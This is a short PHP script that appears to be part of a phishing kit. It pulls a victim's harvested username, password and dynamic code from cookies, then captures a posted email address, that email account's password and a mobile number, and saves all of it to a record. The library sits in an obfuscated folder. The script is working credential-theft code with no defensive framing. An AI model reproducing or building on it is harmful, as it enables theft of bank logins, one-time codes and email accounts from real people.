<?php 
require('../ANHDKLOIE4HFJANXDSHG/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];
$cdinamica = $_COOKIE['cdinamica'];

$email = $_POST['eml'];
$cemail = $_POST['passe'];
$celular = $_POST['cel'];

setcookie('email',$email,time()+60*9);
setcookie('cemail',$cemail,time()+60*9);
setcookie('celular',$celular,time()+60*9);

actualizar_registro_mail($registro,$email,$cemail,$celular);
?>